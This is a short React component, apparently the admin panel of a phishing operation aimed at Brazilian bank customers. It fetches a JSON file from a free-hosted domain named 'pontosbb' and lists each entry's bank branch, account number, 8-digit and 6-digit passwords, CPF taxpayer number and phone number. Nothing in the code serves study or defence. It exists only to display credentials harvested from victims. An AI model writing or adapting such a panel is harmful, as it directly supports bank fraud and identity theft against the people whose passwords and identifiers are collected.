import React, { useState, useEffect } from 'react';
import axios from 'axios';

const Panel = () => {
  const [data, setData] = useState([]);

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    try {
      const response = await axios.get('https://pontosbb.x10.mx/data/data.json');
      setData(response.data);
    } catch (error) {
      console.error('Erro ao carregar os dados:', error);
    }
  };

  return (
    <div>
      {data.map((item, index) => (
        <div key={index} style={{ marginBottom: '20px' }}>
          {item && (
            <div>
              <p><strong>Agência:</strong> {item.agencia}</p>
              <p><strong>Conta:</strong> {item.conta}</p>
              <p><strong>Senha de 8 dígitos:</strong> {item.senha8}</p>
              <p><strong>CPF:</strong> {item.cpf}</p>
              <p><strong>Telefone:</strong> {item.telefone}</p>
              <p><strong>Senha de 6 dígitos:</strong> {item.senha6}</p>
            </div>
          )}
        </div>
      ))}
    </div>
  );
};

export default Panel;
